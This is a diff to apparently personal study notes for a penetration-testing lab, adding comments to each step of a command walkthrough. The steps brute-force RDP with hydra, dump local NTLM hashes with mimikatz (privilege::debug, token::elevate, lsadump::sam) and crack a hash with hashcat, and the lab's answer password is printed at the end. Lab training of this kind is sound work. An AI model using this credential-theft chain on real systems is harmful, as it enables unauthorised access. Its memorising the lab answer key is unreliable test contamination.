@@ -196,35 +196,49 @@ Lab 1 - Follow the steps outlined in this section and find the flag on the nelly
 
 Lab 2 - Access VM #2 via RDP as user nadine with the password retrieved in the exercise of the section labeled "Password Manager" and leverage the methods from this section to extract Steve's NTLM hash. Use best66.rule for the cracking process and enter the plain text password as answer to this exercise.
 >``` shell
+># 1) Enumerate the target to confirm RDP is running and identify the service on port 3389
 >kali@kali:~$ nmap -p 3389 -sV 192.168.241.227
 >
+># 2) Perform a dictionary attack against RDP for user "nadine" using rockyou.txt
 >kali@kali:~$ hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.241.227
 >
->xfreerdp3 /u:nadine /p:123abc /v:192.168.241.227 /cert:ignore
+># 3) RDP into VM #2 as nadine using the cracked password from Hydra (example: 123abc)
+>kali@kali:~$ xfreerdp3 /u:nadine /p:123abc /v:192.168.241.227 /cert:ignore
 >
+># 4) (On Windows) Enumerate local user accounts to confirm the presence of user "steve"
 >PS C:\Windows\system32> Get-LocalUser
 >
+># 5) Navigate to the tools directory where mimikatz is stored
 >PS C:\Windows\system32> cd C:\tools
 >
+># 6) Verify that mimikatz.exe exists in the tools directory
 >PS C:\tools> ls
 >
+># 7) Launch mimikatz for credential extraction
 >PS C:\tools> .\mimikatz.exe
 >
+># 8) Enable SeDebugPrivilege to allow access to protected system processes
 >mimikatz # privilege::debug
 >
+># 9) Elevate / impersonate NT AUTHORITY\SYSTEM to gain maximum local privileges
 >mimikatz # token::elevate
 >
+># 10) Dump the local SAM database to extract NTLM hashes for local users (including steve)
 >mimikatz # lsadump::sam
 >
->cat > steve.hash << EOF
->2835573fb334e3696ef62a00e5cf7571 
+># 11) (Back on Kali) Save Steve’s NTLM hash to a file for offline cracking
+>kali@kali:~$ cat > steve.hash << EOF
+>2835573fb334e3696ef62a00e5cf7571
 >EOF
 >
->hashcat --help | grep -i ntlm
+># 12) Confirm the correct Hashcat mode for NTLM hashes (mode 1000)
+>kali@kali:~$ hashcat --help | grep -i ntlm
 >
->hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt \
+># 13) Crack Steve’s NTLM hash offline using rockyou.txt and best64.rule
+>kali@kali:~$ hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt \
 >-r /usr/share/hashcat/rules/best64.rule
 >
->hashcat -m 1000 steve.hash --show
+># 14) Display the cracked plaintext password from Hashcat’s potfile
+>kali@kali:~$ hashcat -m 1000 steve.hash --show
 >```
 >francesca77
